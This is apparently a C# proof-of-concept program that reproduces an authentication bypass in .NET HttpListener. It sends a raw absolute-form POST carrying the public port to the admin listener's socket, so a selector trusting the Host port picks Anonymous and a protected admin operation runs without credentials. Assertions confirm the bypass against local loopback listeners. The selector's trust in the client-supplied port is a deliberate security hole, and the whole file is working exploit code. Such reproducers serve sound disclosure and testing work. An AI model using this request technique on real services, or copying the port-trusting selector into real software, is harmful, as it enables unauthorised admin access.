using System;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

class Program
{
    private const string Sentinel = "CROSS_PORT_ADMIN_AUTH_BYPASS_7a3e";
    private static readonly string SideEffectPath =
        Path.Combine(Path.GetTempPath(), "httplistener-cross-port-7a3e.txt");

    record Obs(
        string Name,
        string FirstLine,
        bool BasicChallenge,
        bool PublicContext,
        bool AdminContext,
        AuthenticationSchemes Selected,
        string UserHostName,
        string UrlAuthority,
        bool SideEffect);

    static int FreePort()
    {
        using var l=new TcpListener(IPAddress.Loopback,0);
        l.Start();
        int p=((IPEndPoint)l.LocalEndpoint).Port;
        l.Stop();
        return p;
    }

    static void Require(bool condition,string message)
    {
        if(!condition) throw new Exception("ASSERTION_FAILED: "+message);
    }

    static async Task<string> ReadAll(NetworkStream ns)
    {
        using var ms=new MemoryStream();
        byte[] b=new byte[4096];
        using var cts=new CancellationTokenSource(TimeSpan.FromSeconds(5));
        try
        {
            while(true)
            {
                int n=await ns.ReadAsync(b,cts.Token);
                if(n==0) break;
                await ms.WriteAsync(b.AsMemory(0,n),cts.Token);
            }
        }
        catch(OperationCanceledException){}
        return Encoding.ASCII.GetString(ms.ToArray());
    }

    static async Task<Obs> Run(
        string name,
        int publicPort,
        int adminPort,
        int connectPort,
        Func<int,int,string> requestFactory)
    {
        try{File.Delete(SideEffectPath);}catch{}

        using var publicListener=new HttpListener();
        using var adminListener=new HttpListener();

        publicListener.Prefixes.Add($"http://app.test:{publicPort}/public/");
        adminListener.Prefixes.Add($"http://app.test:{adminPort}/admin/");

        publicListener.AuthenticationSchemes=AuthenticationSchemes.Anonymous;

        AuthenticationSchemes selected=AuthenticationSchemes.None;
        string selectorUserHost="<not-called>";
        string selectorUrlAuthority="<not-called>";

        adminListener.AuthenticationSchemes=AuthenticationSchemes.None;
        adminListener.Realm="cross-port-admin";
        adminListener.AuthenticationSchemeSelectorDelegate=request =>
        {
            selectorUserHost=request.UserHostName ?? "<null>";
            selectorUrlAuthority=request.Url?.Authority ?? "<null>";

            int colon=selectorUserHost.LastIndexOf(':');
            int seenPort=-1;
            if(colon>=0)
                int.TryParse(selectorUserHost[(colon+1)..],out seenPort);

            selected=seenPort==publicPort
                ? AuthenticationSchemes.Anonymous
                : AuthenticationSchemes.Basic;

            Console.WriteLine(
                $"SELECTOR case={name} UserHostName={selectorUserHost} UrlAuthority={selectorUrlAuthority} PublicPort={publicPort} AdminPort={adminPort} SeenPort={seenPort} Selected={selected}");

            return selected;
        };

        publicListener.Start();
        adminListener.Start();

        Task<HttpListenerContext> publicTask=publicListener.GetContextAsync();
        Task<HttpListenerContext> adminTask=adminListener.GetContextAsync();

        using var client=new TcpClient();
        await client.ConnectAsync(IPAddress.Loopback,connectPort);
        using NetworkStream ns=client.GetStream();

        string raw=requestFactory(publicPort,adminPort);
        Console.WriteLine($"RAW case={name} connectPort={connectPort} {raw.Replace("\r","<CR>").Replace("\n","<LF>")}");

        await ns.WriteAsync(Encoding.ASCII.GetBytes(raw));
        await ns.FlushAsync();

        Task<string> wireTask=ReadAll(ns);
        Task first=await Task.WhenAny(publicTask,adminTask,wireTask,Task.Delay(5000));

        bool publicContext=false;
        bool adminContext=false;

        if(first==publicTask && publicTask.IsCompletedSuccessfully)
        {
            publicContext=true;
            var ctx=await publicTask;
            byte[] body=Encoding.ASCII.GetBytes("PUBLIC_OK\n");
            ctx.Response.StatusCode=200;
            ctx.Response.ContentLength64=body.Length;
            await ctx.Response.OutputStream.WriteAsync(body);
            ctx.Response.Close();
        }
        else if(first==adminTask && adminTask.IsCompletedSuccessfully)
        {
            adminContext=true;
            var ctx=await adminTask;

            Console.WriteLine(
                $"ADMIN_CONTEXT case={name} LocalPort={ctx.Request.LocalEndPoint.Port} UserHostName={ctx.Request.UserHostName} UrlAuthority={ctx.Request.Url?.Authority} UrlPort={ctx.Request.Url?.Port} User={(ctx.User is null ? "ANONYMOUS":"AUTHENTICATED")}");

            File.WriteAllText(SideEffectPath,"CROSS_PORT_PROTECTED_ADMIN_OPERATION_EXECUTED");

            byte[] body=Encoding.ASCII.GetBytes(Sentinel+"\n");
            ctx.Response.StatusCode=200;
            ctx.Response.ContentLength64=body.Length;
            await ctx.Response.OutputStream.WriteAsync(body);
            ctx.Response.Close();
        }

        string wire=await wireTask;
        string firstLine=wire.Split(new[]{"\r\n","\n"},StringSplitOptions.None)[0];
        bool basic=wire.Contains("WWW-Authenticate: Basic",StringComparison.OrdinalIgnoreCase);
        bool sideEffect=File.Exists(SideEffectPath);

        Console.WriteLine(
            $"RESULT case={name} connectPort={connectPort} first={firstLine} basicChallenge={basic} publicContext={publicContext} adminContext={adminContext} selected={selected} selectorUserHost={selectorUserHost} selectorUrlAuthority={selectorUrlAuthority} sideEffect={sideEffect}");

        publicListener.Close();
        adminListener.Close();

        return new Obs(name,firstLine,basic,publicContext,adminContext,selected,selectorUserHost,selectorUrlAuthority,sideEffect);
    }

    static async Task Main()
    {
        Console.WriteLine($"FRAMEWORK={RuntimeInformation.FrameworkDescription}");
        Console.WriteLine($"OS={RuntimeInformation.OSDescription}");

        int publicPort=FreePort();
        int adminPort=FreePort();
        while(adminPort==publicPort)
            adminPort=FreePort();

        Obs publicControl=await Run(
            "PUBLIC_CONTROL",
            publicPort,adminPort,publicPort,
            (pub,adm)=>$"GET /public/ HTTP/1.1\r\nHost: app.test:{pub}\r\nConnection: close\r\n\r\n");

        Obs adminControl=await Run(
            "ADMIN_CONTROL",
            publicPort,adminPort,adminPort,
            (pub,adm)=>$"POST /admin/change HTTP/1.1\r\nHost: app.test:{adm}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");

        Obs attack=await Run(
            "ABSOLUTE_PUBLIC_PORT_TO_ADMIN_SOCKET",
            publicPort,adminPort,adminPort,
            (pub,adm)=>$"POST http://app.test:{pub}/admin/change HTTP/1.1\r\nHost: app.test:{pub}\r\nContent-Length: 0\r\nConnection: close\r\n\r\n");

        Require(publicControl.FirstLine.Contains("200"),"public-port control must be 200");
        Require(publicControl.PublicContext && !publicControl.AdminContext,
            "public-port request must route to public listener");

        Require(adminControl.FirstLine.Contains("401"),"admin-port control must require Basic");
        Require(adminControl.BasicChallenge && adminControl.Selected==AuthenticationSchemes.Basic,
            "admin-port control must produce Basic challenge");
        Require(!adminControl.AdminContext && !adminControl.SideEffect,
            "admin-port no-credential control must not execute admin operation");

        Require(attack.FirstLine.Contains("200"),
            "cross-port absolute-form attack must return protected admin response");
        Require(!attack.BasicChallenge,
            "cross-port attack must omit Basic challenge");
        Require(!attack.PublicContext && attack.AdminContext,
            "framework must route connection on admin socket to admin listener");
        Require(attack.Selected==AuthenticationSchemes.Anonymous,
            "selector must classify request as public-port Anonymous");
        Require(attack.UserHostName.EndsWith($":{publicPort}",StringComparison.Ordinal),
            "selector must observe public request-target port");
        Require(attack.UrlAuthority.EndsWith($":{adminPort}",StringComparison.Ordinal),
            "Request.Url used for routing must expose actual admin local port");
        Require(attack.SideEffect,
            "protected admin operation must execute without credentials");

        Console.WriteLine($"PUBLIC_PORT={publicPort}");
        Console.WriteLine($"ADMIN_PORT={adminPort}");
        Console.WriteLine($"SIDE_EFFECT_PATH={SideEffectPath}");
        Console.WriteLine("CROSS_PORT_FRAMEWORK_AUTH_BYPASS=CONFIRMED");
    }
}
